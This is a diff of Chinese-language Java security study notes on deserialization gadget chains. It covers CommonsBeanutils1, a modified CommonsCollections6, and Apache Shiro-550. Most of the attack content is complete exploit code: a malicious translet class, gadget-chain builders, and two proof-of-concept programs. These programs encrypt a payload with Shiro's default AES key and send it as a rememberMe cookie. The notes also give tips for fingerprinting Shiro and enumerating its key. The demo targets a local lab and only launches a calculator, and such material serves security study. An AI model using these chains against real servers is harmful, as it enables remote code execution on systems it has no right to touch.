+- 而 getOutputProperties 这个名字，是以 get 开头，正符合getter的定义。 所以， PropertyUtils.getProperty( o1, property ) 这段代码，**当o1是一个 TemplatesImpl 对 象，而 property 的值为 outputProperties 时，将会自动调用getter**，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。
+
+**反序列化利用链构造**:
+
+- Evil.java
+
+    - ```java
+        package cc;
+        
+        import com.sun.org.apache.xalan.internal.xsltc.DOM;
+        import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+        import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+        import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+        import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+        
+        import java.io.IOException;
+        
+        public class Evil extends AbstractTranslet {
+            static {
+                try {
+                    Runtime.getRuntime().exec("calc");
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        
+        
+            @Override
+            public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        
+            }
+        
+            @Override
+            public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        
+            }
+        }
+        
+        ```
+
+- 首先还是创建TemplateImpl：
+
+    - ```java
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(cc.Evil.class.getName());
+        
+        byte[] code = clazz.toBytecode();
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][] {code});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        ```
+
+- 然后，我们实例化本篇讲的 BeanComparator 。 BeanComparator 构造函数为空时，默认的 property 就是空：
+
+    - ```java
+        final BeanComparator comparator = new BeanComparator();
+        ```
+
+- 然后用这个comparator实例化优先队列 PriorityQueue ：
+
+    - ```java
+        //初始化队列
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+        // stub data for replacement later
+        queue.add(1);
+        queue.add(1);
+        ```
+
+- 可见，我们添加了两个无害的可以比较的对象进队列中。前文说过， `BeanComparator#compare()` 中， 如果 this.property 为空，则直接比较这两个对象。这里实际上就是对两个 1 进行排序。 初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。
+
+- **然后，我们再用反射将 property 的值设置成恶意的 outputProperties** ，将队列里的1个1替换成恶意的 TemplateImpl 对象：
+
+    - ```
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{obj, obj});
+        ```
+
+- 最后完成整个CommonsBeanutils1利用链：
+
+    - ```
+        package cc;
+        
+        import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+        import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+        import javassist.CannotCompileException;
+        import javassist.ClassPool;
+        import javassist.CtClass;
+        import javassist.NotFoundException;
+        import org.apache.commons.beanutils.BeanComparator;
+        
+        import java.io.*;
+        import java.lang.reflect.Field;
+        import java.util.PriorityQueue;
+        
+        public class CB {
+            public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+                Field field = obj.getClass().getDeclaredField(fieldName);
+                field.setAccessible(true);
+                field.set(obj, value);
+            }
+            public static void main(String[] args) throws Exception {
+                ClassPool pool = ClassPool.getDefault();
+                CtClass clazz = pool.get(cc.Evil.class.getName());
+        
+                byte[] code = clazz.toBytecode();
+                TemplatesImpl obj = new TemplatesImpl();
+                setFieldValue(obj, "_bytecodes", new byte[][] {code});
+                setFieldValue(obj, "_name", "HelloTemplatesImpl");
+                setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        
+                //初始化比较器
+                final BeanComparator comparator = new BeanComparator();
+        
+                //初始化队列
+                final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
+                // stub data for replacement later
+                queue.add(1);
+                queue.add(1);
+        
+                setFieldValue(comparator, "property", "outputProperties");
+                setFieldValue(queue, "queue", new Object[]{obj, obj});
+        
+                FileOutputStream f = new FileOutputStream("./test.txt");
+                ObjectOutputStream out = new ObjectOutputStream(f);  //创建一个对象输出流
+                out.writeObject(queue);  //将我们构造的 AnnotationInvocationHandler类进行序列化
+                out.flush();
+                out.close();
+                //开始反序列化test.txt文件
+                Unser();
+            }
+        
+            public static void Unser() throws IOException,ClassNotFoundException{
+                FileInputStream in = new FileInputStream("./test.txt");   //实例化一个文件输入流
+                ObjectInputStream ins = new ObjectInputStream(in);      //实例化一个对象输入流
+                CC6.User u= (CC6.User) ins.readObject();   //反序列化
+                System.out.println("反序列化成功！");
+                ins.close();
+            }
+            class User {
+            }
+        }
+        
+        
+        ```
+
+    - 同样弹两次计算器，可以只设置一个对象为TemplatesImpl对象，另外设置一个可序列化的对象即可
+
+##### **Shiro-550利用的难点**
+
+- 还记得Shiro反序列化漏洞吗？我们用IDE打开之前我写的Shiro最简单的例子shirodemo。
+
+- 这个 demo中添加了几个依赖库： 
+
+    1. shiro-core、shiro-web，这是shiro本身的依赖 
+    2.  javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这 两个依赖 
+    3.  slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖
+    4.  commons-logging，这是shiro中用到的一个接口，不添加会爆 java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory 错误 
+    5. commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖 
+
+- 前4个依赖都和项目本身有关，少了他们这个demo会出错或功能缺失。但是第5个依赖，commonscollections主要是为了演示漏洞。
+
+- 那么，实际场景下，目标可能并没有安装commons-collections，这 个时候shiro反序列化漏洞是否仍然可以利用呢？ 我们将pom.xml中关于commons-collections的部分删除，重新加载Maven，此时观察IDEA中的依赖 库
+
+    - ![image-20221031193929305](./java代码审计.assets/image-20221031193929305.png)
+
+- commons-beanutils赫然在列。 也就是说，Shiro是依赖于commons-beanutils的。那么，是否可以用到本文讲的CommonsBeanutils1 利用链呢？ 尝试生成一个Payload发送，并没有成功，此时在Tomcat的控制台可以看到报错信息：
+
+    - ```
+        org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc
+        serialVersionUID = -2044202215314119608, local class serialVersionUID =
+        -3490850999041592962
+        ```
+
+- 这个错误是什么意思？
+
+serialVersionUID是什么？
+
+- 如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通 信的时候就可能因为不兼容导致出现隐患。
+
+- 因此，Java在反序列化的时候提供了一个机制，序列化时会 根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方 的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。 
+
+- 当然，开发者也可以手工给类赋予一个 serialVersionUID 值，此时就能手工控制兼容性了。 
+
+- 所以，出现错误的原因就是，本地使用的commons-beanutils是1.9.2版本，而Shiro中自带的 commons-beanutils是1.8.3版本，出现了 serialVersionUID 对应不上的问题。 
+
+- 解决方法也比较简单，将本地的commons-beanutils也换成1.8.3版本。 更换版本后，再次生成Payload进行测试，此时Tomcat端爆出了另一个异常，仍然没有触发代码执行：
+
+    - ```java
+        Unable to load class named
+        [org.apache.commons.collections.comparators.ComparableComparator]
+        ```
+
+- 简单来说就是没找到 `org.apache.commons.collections.comparators.ComparableComparator` 类，从包名即可看出，这个类是来自于commons-collections。 
+
+- commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽 然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。 难道没有commons-collections就无法进行反序列化利用吗？当然有。
+
+**无依赖的Shiro反序列化利用链**
+
+- 我们先来看看 `org.apache.commons.collections.comparators.ComparableComparator` 这个类在 哪里使用了
+- 在 BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator 。 既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：
+    -  实现 java.util.Comparator 接口 
+    - 实现 java.io.Serializable 接口 
+    - Java、shiro或commons-beanutils自带，且兼容性强 通过IDEA的功能，我们找到一个 CaseInsensitiveComparator ：
+
+通过IDEA的功能，我们找到一个 CaseInsensitiveComparator ：
+
+- ![image-20221031210220848](./java代码审计.assets/image-20221031210220848.png)
+
+相关代码如下：
+
+- ```java
+       public static final Comparator<String> CASE_INSENSITIVE_ORDER
+                                             = new CaseInsensitiveComparator();
+        private static class CaseInsensitiveComparator
+                implements Comparator<String>, java.io.Serializable {
+            // use serialVersionUID from JDK 1.2.2 for interoperability
+            private static final long serialVersionUID = 8575799808933029326L;
+    
+            public int compare(String s1, String s2) {
+                int n1 = s1.length();
+                int n2 = s2.length();
+                int min = Math.min(n1, n2);
+                for (int i = 0; i < min; i++) {
+                    char c1 = s1.charAt(i);
+                    char c2 = s2.charAt(i);
+                    if (c1 != c2) {
+                        c1 = Character.toUpperCase(c1);
+                        c2 = Character.toUpperCase(c2);
+                        if (c1 != c2) {
+                            c1 = Character.toLowerCase(c1);
+                            c2 = Character.toLowerCase(c2);
+                            if (c1 != c2) {
+                                // No overflow because of numeric promotion
+                                return c1 - c2;
+                            }
+                        }
+                    }
+                }
+                return n1 - n2;
+            }
+    
+    ```
+
+- 这个 CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了 Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。 
+
+- 我们通过 `String.CASE_INSENSITIVE_ORDER` 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：
+
+    - ```java
+        final BeanComparator comparator = new BeanComparator(null,
+        String.CASE_INSENSITIVE_ORDER);
+        ```
+
+- 最后，构造出新的CommonsBeanutils1Shiro利用链：
+
+#### 原生反序列化利用链 JDK7u21
+
+- 没有合适的第三方库存在时，Java反序列化是否还能利用?
+- 这是一件幸运又不幸的事情，幸运的是，的确存在不依赖第三方库的Java反序列 化利用链，不幸的是，新的Java版本没有这样的问题。 这条利用链就是JDK7u21，顾名思义，它适用于Java 7u21及以前的版本。
+- 所以，在阅读并复现本文章前，需要先安装Java 7u21，并在项目中将版本设置为7u21。
+
+#### 原生反序列化链 jdk8u20
+
+- 
 
 ### 反序列化漏洞回显与内存马：
 
@@ -2527,18 +3354,7 @@
 #### **defineClass异常回显**
 
 - 先说defineClass这个东西是因为下面的几种方式都是在其基础上进行改进。defineClass归属于ClassLoader类，其主要作用就是使用编译好的字节码就可以定义一个类。
-
 - 我们定义的
-
-- ```
-    
-    
-    ```
-
-- ```
-    
-    ```
-
 - 
 
 #### RMI绑定实例
@@ -2589,26 +3405,486 @@
 
 #### shiro反序列化漏洞：
 
-- **（Shiro-550）**
+##### shiro介绍
 
-  - **漏洞影响版本：Apache Shiro <= 1.2.4**
-  - shiro特征：`rememberMe=deleteMe`字段
-  - ![image-20220603203711370](java代码审计.assets/image-20220603203711370.png)
+- Shiro本身是⼀个轻便的权限验证库，它并不⼀定依赖于WEB，并且由于其可以兼容⼤多数中间件 （Tomcat、Spring...），所以被⼴泛使⽤，其产⽣了许多⾼危漏洞诸如反序列化、权限绕过等。
 
-    - 所以知道了key就可以构造反序列化了注入了。因为shiro的反序列化重写了一部分，所以一部分cc链没办法使用，但是还是有可以使用的cc链。
-  - **（Shiro-721）**（[CVE-2016-4437） ](https://www.cnblogs.com/backlion/p/14077791.html)）
+- 目前，使用 Apache Shiro 的人越来越多，因为它相 当简单，对比 Spring Security，可能没有 Spring Security 做的功能强大，但是在实际工作时 可能并不需要那么复杂的东西，所以使用小而简单的 Shiro 就足够了。
+-  Shiro 三个核心组件 
+    - Subject：即“当前操作用发户”。但是，在 Shiro 中，Subject 这一概念并不仅仅指人， 也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前 跟软件交互的东西”。但考虑到大多数目的和用途，你可以把它认为是 Shiro 的“用户”概念。 Subject 代表了当前用户的安全操作，SecurityManager 则管理所有用户的安全操作。 
+    - SecurityManager：它是 Shiro 框架的核心，典型的 Facade 模式，Shiro 通过 SecurityManager 来管理内部组件实例，并通过它来提供安全管理的各种服务。 
+    - Realm 充当了 Shiro 与应用安全数据间的“桥梁”或者“连接器”。
+        - 也就是说，当对用户执 行认证（登录）和授权（访问控制）验证时，Shiro 会从应用配置的 Realm 中查找用户及其 权限信息。 
+        - 从这个意义上讲，Realm 实质上是一个安全相关的 DAO：它封装了数据源的连接细节， 并在需要时将相关数据提供给 Shiro。当配置 Shiro 时，你必须至少指定一个 Realm，用于 认证和（或）授权。
+        - 配置多个 Realm 是可以的，但是至少需要一个。 Shiro 内置了可以连接大量安全数据源（又名目录）的 Realm，如 LDAP、关系数据库 （JDBC）、类似 INI 的文本配置资源以及属性文件等。如果缺省的 Realm 不能满足需求， 你还可以插入代表自定义数据源的自己的 Realm 实现。
 
-    - **影响版本**Apache Shiro <= 1.4.1
-    - 攻击要求：
 
-      - （需要一个合法的登录账号，基于Padding Oracle attack来实现的攻击）
-      - 这玩意要一直爆破，对网站大概要爆破几个小时，没啥实际用途。
-    - 漏洞指纹
 
-      1.set-Cookie: rememberMe=deleteMe
-      2.URL中有shiro字样
-      3.有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可
-  - 在1.2.4版本后，shiro已经更换 AES-CBC AES-CBC 为 AES-GCM AES-GCM ，无法再通过Padding Oracle遍历key。
+##### **Shiro-550  (CVE-2016-4437)**
+
+- **漏洞影响版本：Apache Shiro <= 1.2.4**
+- shiro特征：
+    - 在请求包的Cookie中为？remeberMe字段赋任意值
+    - 返回包中存在set-Cookie：remeberMe=deleteMe
+    - URL中有shiro字样
+    - 有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可
+
+**环境搭建**
+
+- https://github.com/phith0n/JavaThings/blob/master/shirodemo
+
+- 项目依赖
+
+    - ```
+        shiro-core、shiro-web，这是shiro本身的依赖
+        javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这
+        两个依赖
+        slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖
+        commons-logging，这是shiro中用到的一个接口，不添加会爆
+        java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory 错误
+        commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖
+        ```
+
+- 我们使用 mvn package 将项目打包成war包，放在Tomcat的webapps目录下。然后访问 http://localhost:8080/shirodemo/ ，会跳转到登录页面
+
+- 然后输入正确的账号密码，root/secret，成功登录：
+
+    - ![image-20221030214224779](./java代码审计.assets/image-20221030214224779.png)
+
+- 如果登录时选择了remember me的多选框，则登录成功后服务端会返回一个rememberMe的Cookie：
+
+**漏洞原理**
+
+- Shiro的原理比较简单：为了让浏览器或服务器重 启后用户不丢失登录状态，**Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中**，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。
+
+- ![image-20220603203711370](java代码审计.assets/image-20220603203711370.png)
+
+  
+
+  - 所以知道了key就可以构造反序列化了注入了。**因为shiro的反序列化重写了一部分，所以一部分cc链没办法使用，但是还是有可以使用的cc链。**
+
+- 对此，我们攻击过程如下： 
+
+    - 1. 使用以前学过的CommonsCollections利用链生成一个序列化Payload 
+        2. 使用Shiro默认Key进行加密 
+        3. 将密文作为rememberMe的Cookie发送给服务端
+
+    - poc
+
+        - ```java
+            package cc;
+            
+            
+            import org.apache.commons.collections.Transformer;
+            import org.apache.commons.collections.functors.ChainedTransformer;
+            import org.apache.commons.collections.functors.ConstantTransformer;
+            import org.apache.commons.collections.functors.InvokerTransformer;
+            import org.apache.commons.collections.keyvalue.TiedMapEntry;
+            import org.apache.commons.collections.map.LazyMap;
+            import org.apache.shiro.crypto.AesCipherService;
+            import org.apache.shiro.util.ByteSource;
+            
+            import java.io.BufferedReader;
+            import java.io.ByteArrayOutputStream;
+            import java.io.InputStreamReader;
+            import java.io.ObjectOutputStream;
+            import java.lang.reflect.Field;
+            import java.net.HttpURLConnection;
+            import java.net.URL;
+            import java.util.HashMap;
+            import java.util.List;
+            import java.util.Map;
+            
+            
+            class CommonsCollections6 {
+                public byte[] getPayload(String command) throws Exception {
+                    Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
+                    Transformer[] transformers = new Transformer[]{
+                            new ConstantTransformer(Runtime.class),
+                            new InvokerTransformer("getMethod", new Class[]{String.class,
+                                    Class[].class}, new Object[]{"getRuntime",
+                                    new Class[0]}),
+                            new InvokerTransformer("invoke", new Class[]{Object.class,
+                                    Object[].class}, new Object[]{null, new Object[0]}),
+                            new InvokerTransformer("exec", new Class[]{String.class},
+                                    new String[]{command}),
+                            new ConstantTransformer(1),
+                    };
+                    Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+            
+                    // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
+                    Map innerMap = new HashMap();
+                    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+            
+                    TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+            
+                    Map expMap = new HashMap();
+                    expMap.put(tme, "valuevalue");
+            
+                    outerMap.remove("keykey");
+            
+                    Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
+                    f.setAccessible(true);
+                    f.set(transformerChain, transformers);
+            
+                    ByteArrayOutputStream barr = new ByteArrayOutputStream();
+                    ObjectOutputStream oos = new ObjectOutputStream(barr);
+                    oos.writeObject(expMap);
+                    oos.close();
+            
+                    return barr.toByteArray();
+                }
+            }
+            
+            public class Shiro550 {
+                public static void main(String []args) throws Exception {
+                    byte[] payloads = new CommonsCollections6().getPayload("calc.exe");
+                    AesCipherService aes = new AesCipherService();
+                    byte[] key =
+                            java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
+                    ByteSource ciphertext = aes.encrypt(payloads, key);
+                    System.out.printf(ciphertext.toString());
+            
+            
+            
+                    //发送攻击请求
+                    URL url = new URL("http://localhost:8080/shirodemo_war_exploded/");
+                    //得到连接对象
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            
+                    // 设置通用的请求属性
+                    connection.setRequestProperty("accept", "*/*");
+                    connection.setRequestProperty("connection", "Keep-Alive");
+                    connection.setRequestProperty("user-agent",
+                            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
+                    //设置cookie
+                    connection.setRequestProperty("cookie","rememberMe="+ciphertext.toString());
+                    // 建立实际的连接
+                    connection.connect();
+                    // 获取所有响应头字段
+                    Map<String, List<String>> map = connection.getHeaderFields();
+                    // 遍历所有的响应头字段
+                    for (String k : map.keySet()) {
+                        System.out.println(k + "--->" + map.get(k));
+                    }
+                    String result = "";
+                    BufferedReader in = null;
+                    // 定义 BufferedReader输入流来读取URL的响应
+                    in = new BufferedReader(new InputStreamReader(
+                            connection.getInputStream()));
+                    String line;
+                    while ((line = in.readLine()) != null) {
+                        result += line;
+                    }
+                    try {
+                        if (in != null) {
+                            in.close();
+                        }
+                    } catch (Exception e2) {
+                        e2.printStackTrace();
+                    }
+                    System.out.println(result);
+            
+                }
+            
+            }
+            ```
+
+- 直接将这段字符串作为rememberMe的值（不做url编码），发送给shiro。结果并没有像我想的那样弹 出计算器，而是Tomcat出现了报错：
+
+    - ```cmd
+        org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array.
+        	at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:82)
+        	at org.apache.shiro.mgt.AbstractRememberMeManager.deserialize(AbstractRememberMeManager.java:514)
+        	at org.apache.shiro.mgt.AbstractRememberMeManager.convertBytesToPrincipals(AbstractRememberMeManager.java:431)
+        	at 
+            ....................................................
+        ```
+
+- 这是为什么？
+
+    - 我们找到异常信息的倒数第一行，也就是这个类： `org.apache.shiro.io.ClassResolvingObjectInputStream` 。可以看到，这是一个 ObjectInputStream的子类，其重写了 resolveClass 方法：
+
+    - ```java
+        //
+        // Source code recreated from a .class file by IntelliJ IDEA
+        // (powered by FernFlower decompiler)
+        //
+        
+        package org.apache.shiro.io;
+        
+        import java.io.IOException;
+        import java.io.InputStream;
+        import java.io.ObjectInputStream;
+        import java.io.ObjectStreamClass;
+        import org.apache.shiro.util.ClassUtils;
+        import org.apache.shiro.util.UnknownClassException;
+        
+        public class ClassResolvingObjectInputStream extends ObjectInputStream {
+            public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException {
+                super(inputStream);
+            }
+        
+            protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
+                try {
+                    return ClassUtils.forName(osc.getName());
+                } catch (UnknownClassException var3) {
+                    throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", var3);
+                }
+            }
+        }
+        
+        ```
+
+    - resolveClass 是反序列化中用来查找类的方法，简单来说，读取序列化流的时候，读到一个字符串形 式的类名，需要通过这个方法来找到对应的 java.lang.Class 对象。
+
+    - 对比一下它的父类，也就是正常的 ObjectInputStream 类中的 resolveClass 方法：
+
+        - ```java
+                protected Class<?> resolveClass(ObjectStreamClass desc)
+                    throws IOException, ClassNotFoundException
+                {
+                    String name = desc.getName();
+                    try {
+                        return Class.forName(name, false, latestUserDefinedLoader());
+                    } catch (ClassNotFoundException ex) {
+                        Class<?> cl = primClasses.get(name);
+                        if (cl != null) {
+                            return cl;
+                        } else {
+                            throw ex;
+                        }
+                    }
+                }
+            ```
+
+    - 区别就是前者用的是 `org.apache.shiro.util.ClassUtils#forName` （实际上内部用到了 `org.apache.catalina.loader.ParallelWebappClassLoader#loadClass` ），而后者用的是Java原 生的 Class.forName 。
+
+    - 那么，我们在异常捕捉的位置下个断点，看看是哪个类触发了异常：
+
+    - 可见，出异常时加载的类名为 [Lorg.apache.commons.collections.Transformer; 。这个类名看起来 怪，其实就是表示 org.apache.commons.collections.Transformer 的数组。 
+
+    - 所以，网上很多文章就给出结论， Class.forName 支持加载数组，而 ClassLoader.loadClass 不支持 加载数组，这个区别导致了问题。 但是经过我的调试发现，事情的原因没有那么简单，中间涉及到大量Tomcat对类加载的处理逻辑，这个分析过程远远无法在本文说清楚，大家可以阅读这两篇文章，并自己亲自调试一下，也许能更深入的了 解这个问题：
+
+        -  https://blog.zsxsoft.com/post/35
+        -  http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/
+
+    -  **这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。**
+
+- **构造不含数组的反序列化Gadget**
+
+    - 为解决这个问题，Orange在其文章中给出了使用JRMP的利用方法：http://blog.orange.tw/2018/03/p wn-ctf-platform-with-java-jrmp-gadget.html。《Java安全漫谈》还没有讲到JRMP，且JRMP需要使用 外连服务器，利用起来会受到限制，我们能不能想想其他方法呢？ 
+
+    - 本文最先说到的 TemplatesImpl 就要粉墨登场啦。我们在文章13中介绍了 TemplatesImpl ，我们可以 通过下面这几行代码来执行一段Java的字节码：
+
+        - ```java
+            TemplatesImpl obj = new TemplatesImpl();
+            setFieldValue(obj, "_bytecodes", new byte[][] {"...bytescode"});
+            setFieldValue(obj, "_name", "HelloTemplatesImpl");
+            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+            obj.newTransformer();
+            ```
+
+    - 而在文章14中我们介绍了，利用 InvokerTransformer 调用 TemplatesImpl#newTransformer 方法：
+
+        - ```java
+            Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(obj),
+            new InvokerTransformer("newTransformer", null, null)
+            };
+            ```
+
+    - 不过，这里仍然用到了Transformer数组，不符合条件。 如何去除这一过程中的Transformer数组呢（只保留一个transformer呢）？
+
+        - wh1t3p1g在[这篇文章](https://www.anquanke.com/post/id/192619)里给出了一个行之有效的方法。 回顾一下，在CommonsCollections6中，我们用到了一个类， TiedMapEntry ，其构造函数接受两个参 数，参数1是一个Map，参数2是一个对象key。 TiedMapEntry 类有个 getValue 方法，调用了map的 get方法，并传入key：
+
+            - ```java
+                public Object getValue() {
+                	return map.get(key);
+                }
+                
+                ```
+
+        - 当这个map是LazyMap时，其get方法就是触发transform的关键点：
+
+            - ```java
+                public Object get(Object key) {
+                // create value for key if key is not currently in the map
+                if (map.containsKey(key) == false) {
+                    Object value = factory.transform(key);
+                    map.put(key, value);
+                    return value;
+                }
+                	return map.get(key);
+                }
+                
+                ```
+
+    - 我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，因为 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。 但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇 的发现，这个 LazyMap#get 的参数key，会被传进transform()，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。 那么我们再回看前面的Transform数组：
+
+    - ```java
+        Transformer[] transformers = new Transformer[]{
+        new ConstantTransformer(obj),
+        new InvokerTransformer("newTransformer", null, null)
+        };
+        ```
+
+    - new ConstantTransformer(obj) 这一步完全是可以去除了，数组长度变成1，那么数组也就不需要 了。 这个过程其实挺巧的，而且和前面几篇文章中的知识紧密结合。如果你发现这一节有点难懂，那么一定 是没有理解Transform数组运行的原理，和CommonsCollections6的原理，回去再看看就好了。 利用这个方法，我们来改造一下CommonsCollections6吧。
+
+- poc
+
+    - ```java
+        package cc;
+        
+        import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+        import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+        import org.apache.commons.collections.Transformer;
+        import org.apache.commons.collections.functors.ChainedTransformer;
+        import org.apache.commons.collections.functors.ConstantTransformer;
+        import org.apache.commons.collections.functors.InvokerTransformer;
+        import org.apache.commons.collections.keyvalue.TiedMapEntry;
+        import org.apache.commons.collections.map.LazyMap;
+        import org.apache.shiro.crypto.AesCipherService;
+        import org.apache.shiro.util.ByteSource;
+        
+        import javax.xml.transform.Templates;
+        import java.io.*;
+        import java.lang.reflect.Field;
+        import java.net.HttpURLConnection;
+        import java.net.URL;
+        import java.util.HashMap;
+        import java.util.List;
+        import java.util.Map;
+        
+        
+        import static cc.CC3.setFieldValue;
+        
+        import javassist.ClassPool;
+        import javassist.CtClass;
+        class CommonsCollections6 {
+            public byte[] getPayload() throws Exception {
+        
+                
+        
+                TemplatesImpl obj = new TemplatesImpl();
+                setFieldValue(obj, "_bytecodes", new byte[][]{});
+                setFieldValue(obj, "_name", "HelloTemplatesImpl");
+                setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        
+                Transformer transformer = new InvokerTransformer("getClass", null, null);
+        
+                Map innerMap = new HashMap();
+                Map outerMap = LazyMap.decorate(innerMap, transformer);
+        
+                TiedMapEntry tme = new TiedMapEntry(outerMap, obj);
+        
+                Map expMap = new HashMap();
+                expMap.put(tme, "valuevalue");
+        
+                outerMap.clear();
+                setFieldValue(transformer, "iMethodName", "newTransformer");
+        
+                // ==================
+                // 生成序列化字符串
+                ByteArrayOutputStream barr = new ByteArrayOutputStream();
+                ObjectOutputStream oos = new ObjectOutputStream(barr);
+                oos.writeObject(expMap);
+                oos.close();
+        
+                return barr.toByteArray();
+            }
+        }
+        
+        public class Shiro550 {
+            public static void main(String []args) throws Exception {
+                byte[] payloads = new CommonsCollections6().getPayload();
+                AesCipherService aes = new AesCipherService();
+        
+                byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
+                ByteSource ciphertext = aes.encrypt(payloads, key);
+                System.out.printf(ciphertext.toString());
+        
+        
+        
+                //发送攻击请求
+                URL url = new URL("http://localhost:8080/shirodemo_war_exploded/");
+                //得到连接对象
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        
+                // 设置通用的请求属性
+                connection.setRequestProperty("accept", "*/*");
+                connection.setRequestProperty("connection", "Keep-Alive");
+                connection.setRequestProperty("user-agent",
+                        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
+                //设置cookie
+                connection.setRequestProperty("cookie","rememberMe="+ciphertext.toString());
+                // 建立实际的连接
+                connection.connect();
+                // 获取所有响应头字段
+                Map<String, List<String>> map = connection.getHeaderFields();
+                // 遍历所有的响应头字段
+                for (String k : map.keySet()) {
+                    System.out.println(k + "--->" + map.get(k));
+                }
+                String result = "";
+                BufferedReader in = null;
+                // 定义 BufferedReader输入流来读取URL的响应
+                in = new BufferedReader(new InputStreamReader(
+                        connection.getInputStream()));
+                String line;
+                while ((line = in.readLine()) != null) {
+                    result += line;
+                }
+                try {
+                    if (in != null) {
+                        in.close();
+                    }
+                } catch (Exception e2) {
+                    e2.printStackTrace();
+                }
+                System.out.println(result);
+        
+            }
+        
+        }
+        ```
+
+    -  弹出两次计算器
+
+- 注意：
+
+    - Shiro不是遇到Tomcat就一定会有数组这个问题 
+    - Shiro-550的修复并不意味着反序列化漏洞的修复，只是默认Key被移除
+
+漏洞修复：
+
+- 
+
+##### shiro的自动化检测
+
+- 使⽤⼀个空的 SimplePrincipalCollection 作为 payload，序列化后使⽤待 检测的秘钥进⾏加密并发送，秘钥正确和错误的响应表现是不⼀样的，可以使⽤这 个⽅法来可靠的枚举 Shiro 当前使⽤的秘钥。
+- 借助这种⽅法，我们就可以将 Shiro 的检测拆为两步 
+    1.  探测 Shiro Key，如果探测成功，则报出秘钥可被枚举的漏洞；如果探测失败直 接结束逻辑 
